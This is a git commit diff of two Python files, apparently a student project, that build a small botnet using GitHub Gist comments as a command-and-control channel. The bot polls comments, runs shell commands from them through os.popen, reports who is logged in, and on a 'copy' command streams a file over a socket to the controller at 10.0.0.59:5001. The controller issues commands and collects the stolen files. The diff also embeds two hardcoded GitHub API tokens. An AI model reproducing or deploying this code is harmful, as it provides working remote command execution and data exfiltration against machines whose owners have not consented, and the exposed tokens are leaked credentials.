2e3a8df38717028b2695f39a6e0dcc64a82f319b
Jiřík, Daniel <jirikdan@fel.cvut.cz>
2023-01-05 01:09:32 +0100

    V2

--- bot.py
+++ bot.py
@@ -2,13 +2,15 @@ from simplegist import Simplegist
 import time
 import random
 import os
-import psutil
-
+import tqdm
+import socket
+import threading
 GHgistController = Simplegist(username='jirikdan', api_token='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')
 GhgistBot = Simplegist(username='TheQfr', api_token='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')
 comments = GHgistController.comments().listall(name='secret.txt')
-
 commentsNumber = len(comments)
+
+
 
 #GHgistController.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body='very helpful')
 
@@ -17,27 +19,79 @@ botIsAliveAnswers = ["Ye, im there", "No, I am soo booored", "Hmm someone is bor
 botIsAliveQuestions = ["Im so bored, you there?", "I wanna talk, but noone is there to talk, or mby?", "Any1 up for some Fortnite?"]
 controllerQuestions = botIsAliveQuestions
 
-print(os.system("who | head -n1 | awk '{print $1;}'"))
+#print(os.system("who | cut -d' ' -f1"))
+
+
+controllerIP = "10.0.0.59"
+SEPARATOR = "<SEPARATOR>"
+BUFFER_SIZE = 1024 * 4 #4KB
+
+
+def send_file(filename, host, port):
+    # get the file size
+    filesize = os.path.getsize(filename)
+    # create the client socket
+    s = socket.socket()
+    try:
+        print("[+] Connecting to " + str(controllerIP) + ":" + str(5001))
+        s.connect((controllerIP, 5001))
+        print("[+] Connected.")
+    except:
+        print("connection error")
+        return
+
+    # send the filename and filesize
+    s.send((str(filename)+str(SEPARATOR)+str(filesize)).encode())
+    time.sleep(7)
+    # start sending the file
+    progress = tqdm.tqdm(range(filesize), "Sending "+str(filename), unit="B", unit_scale=True, unit_divisor=1024)
+    with open(filename, "rb") as f:
+        while True:
+            # read the bytes from the file
+            bytes_read = f.read(BUFFER_SIZE)
+            if not bytes_read:
+                # file transmitting is done
+                break
+            # we use sendall to assure transimission in 
+            # busy networks
+            s.sendall(bytes_read)
+            # update the progress bar
+            progress.update(len(bytes_read))
+            print("progress")
+    # close the socket
+    s.close()
+
 
 def handleCommands(command):
-    print("Command = " + command)
     if command == "Hey":
         GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body='Yo')
     if command in botIsAliveQuestions:
         GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=random.choice(botIsAliveAnswers))
     if command.startswith("w"):
-        print("Handling command W")
-        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=str(os.system('w')))
+        sendStr = os.popen("who | cut -d' ' -f1").read()
+        if sendStr == "":
+            sendStr = "Noone is UP"
+        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=sendStr)
+    if command.startswith("ls"):
+        sendStr = os.popen(command).read()
+        if sendStr == "":
+            sendStr = "There are no files in specified directory"
+        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=sendStr)
+    if command.startswith("copy"):
+        thread = threading.Thread(target=send_file("sendmepls.txt",controllerIP,5001))
+        thread.daemon = True
+        thread.start()
+        
+
 
 while(True):
-     currComments = GHgistController.comments().listall(name='secret.txt')
-     currCommentsNumber = len(currComments)
-     #print(currCommentsNumber)
-     if currCommentsNumber != commentsNumber:
+    currComments = GHgistController.comments().listall(name='secret.txt')
+    currCommentsNumber = len(currComments)
+    if currCommentsNumber != commentsNumber:
         commentsDiff = currCommentsNumber - commentsNumber
         print("Received command")
         for i in range(0,commentsDiff):
             handleCommands(currComments[len(currComments)-1 - i])
 
         commentsNumber = currCommentsNumber
-     time.sleep(3)
+    time.sleep(2)
--- controller.py
+++ controller.py
@@ -2,9 +2,59 @@ from simplegist import Simplegist
 import random
 import time
 import threading
+import socket
+import tqdm
+import os
+
+
+def listenForFiles():
+    SERVER_HOST = "10.0.0.59"
+    SERVER_PORT = 5001
+    BUFFER_SIZE = 4096
+    SEPARATOR = "<SEPARATOR>"
+    s = socket.socket()
+    s.bind((SERVER_HOST, SERVER_PORT))
+    s.listen(10)
+    print("[*] Listening as " + str(SERVER_HOST)+":"+ str(SERVER_PORT))
+    ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=random.choice(botIsAliveQuestion))
+    beforeAsking = len(ghGist.comments().listall(name='secret.txt'))
+    time.sleep(6)
+    afterAsking = len(ghGist.comments().listall(name='secret.txt'))
+    botsAlive = afterAsking - beforeAsking
+    print("Receiving " + str(botsAlive) + " files")
+    for i in range(0, botsAlive):
+        client_socket, address = s.accept() 
+        print("[+] " + str(address) + " is connected.")
+        received = client_socket.recv(BUFFER_SIZE).decode()
+        print (received)
+        filename, filesize = received.split(SEPARATOR)
+        filename = os.path.basename(filename)
+        #print(filename)
+        #print(filesize)
+        filesize = int(filesize)
+        
+        progress = tqdm.tqdm(range(filesize), "Receiving "+ str(filename), unit="B", unit_scale=True, unit_divisor=1024)
+            
+        with open("copiedFiles/"+filename, "wb") as f:
+            while True:
+                    
+                bytes_read = client_socket.recv(BUFFER_SIZE)
+                if not bytes_read:    
+                    break
+                    
+                f.write(bytes_read)
+                    
+                progress.update(len(bytes_read))
+
+
+        client_socket.close()
+        s.close()
+        
+
+
+
 ghGist = Simplegist(username='jirikdan', api_token='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')
-
-
+GhgistBot = Simplegist(username='TheQfr', api_token='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')
 botIsAliveQuestion = ["Im so bored, you there?", "I wanna talk, but noone is there to talk, or mby?", "Any1 up for some Fortnite?"]
 
 ## check if bots are alive periodically
@@ -21,10 +71,14 @@ def checkBots():
 thread = threading.Thread(target=checkBots)
 thread.daemon = True
 thread.start()
-
+#for i in range(4424529,4424429+300):
+    #print(i)
+    #ghGist.comments().delete(name='secret.txt', commentid=i)
+    #GhgistBot.comments().delete(id='8b1ad9484c7acb95f0a72d4c6ece1f06', commentid=i)
+  
 while True:
     #command = raw_input("Paste your command or type HELP for help\n")
-    command = raw_input()
+    command = raw_input("Type your command\n")
     if command == "HELP":
         print("w - (list of users currently logged in)")
         print("ls <PATH> (list content of specified directory)")
@@ -39,3 +93,6 @@ while True:
         ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=command)
     if command.startswith('copy'):
         ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=command)
+        threadListenForFiles = threading.Thread(target=listenForFiles)
+        threadListenForFiles.daemon = True
+        threadListenForFiles.start()
